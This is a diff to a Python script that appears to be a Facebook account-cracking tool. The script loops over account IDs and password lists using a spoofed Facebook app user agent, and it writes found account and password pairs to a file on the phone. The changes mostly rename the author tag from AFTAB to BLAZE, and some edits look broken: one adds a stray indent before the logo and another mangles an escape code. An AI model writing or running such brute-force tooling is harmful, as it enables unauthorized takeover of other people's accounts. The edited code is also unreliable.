@@ -234,14 +234,14 @@ def menu():
 	print('[2] FILE CLONING CHOICE PASS ')
 	print('[5] Exit')
 	linex()
-	Aftab=input('[•] Select Option :')
-	if Aftab =='1':
+	BLAZE=input('[•] Select Option :')
+	if BLAZE =='1':
 		__crack__().plerr()
-	if Aftab =='2':
+	if BLAZE =='2':
 		file()
-	if Aftab =='3':
+	if BLAZE =='3':
 		mrAftab()
-	if Aftab =='4':
+	if BLAZE =='4':
 		print('[•] For this scrpit contact with me');exit()
 	else:
 		print('[•] Select Right Option ');menu()
@@ -348,10 +348,7 @@ class __crack__:
             self.__pler__()
             
 
-            
-    
-
-logo="""
+ logo="""
  \033[1;36 ______   _____          _       ________  ________  
  \033[1;36|_   _ \ |_   _|       / \     |  __   _||_   __  | 
  \033[1;36 | |_) |  | |         / _ \    |_/  / /    | |_ \_| 
@@ -1026,7 +1023,7 @@ def method():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;97m [AFTAB-CP] '+acc+'| '+pword+'')
+                     print('\r\033[1;97m [BLAZE-CP] '+acc+'| '+pword+'')
                 cpacc.append(acc)
                 open('/sdcard/AFTAB-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
@@ -1050,7 +1047,7 @@ def method():
         except:
             last = first
         pers = str(int(loop)/int(len(accounts)) * 100)[:4]
-        sys.stdout.write('\r \033[1;97m[\033[1;97mAFTAB-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.write('\r \033[1;97m[\033[1;97BLAZE-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:
             heads = "Mozilla/5.0 (Linux; Android 12; SM-A536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]"
